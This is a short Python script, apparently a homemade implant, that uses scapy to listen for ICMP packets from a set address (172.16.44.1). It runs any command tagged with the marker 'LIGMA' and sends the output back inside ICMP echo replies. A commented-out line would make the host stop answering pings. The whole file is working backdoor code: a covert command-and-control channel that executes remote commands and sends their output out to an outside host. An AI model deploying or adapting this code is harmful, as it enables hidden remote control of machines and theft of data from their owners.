from asyncio.subprocess import PIPE
from scapy.all import sniff, send, IP, ICMP, conf
from subprocess import Popen

# ignore = Popen(["sysctl","net.ipv4.icmp_echo_ignore_all=1"], stdout=PIPE, stderr = PIPE)
# ignore.communicate()

def check_for_request(packet):
    ip = packet[0][1]
    if type(ip) == IP:
        if ip.src == "172.16.44.1":
            icmp = packet[0][2]
            if type(icmp) == ICMP:
                payload = bytes(icmp.payload)
                ligma_location = payload.find(b"LIGMA")
                if ligma_location != -1:
                    cmd = payload[ligma_location+5:].strip(b'\x00')
                    cmd = str(cmd,"utf-8")
                    process = Popen(list(cmd.split()), stdout=PIPE, stderr=PIPE)
                    stdout, stderr = process.communicate()
                    output = stdout+stderr
                    pieces = []
                    i=0
                    while len(output)-i > 1000:
                        pieces.append(output[i:i+1000])
                        i += 1000
                    pieces.append(output[i:])
                    for piece in pieces:
                        reply = IP(src=packet[0][1].dst, dst=packet[0][1].src)/ICMP(type=0)/("BALLS" + str(piece,"utf-8"))
                        print("Sending reply!")
                        send(reply)
    return None

sniff(iface=conf.iface, prn=check_for_request)
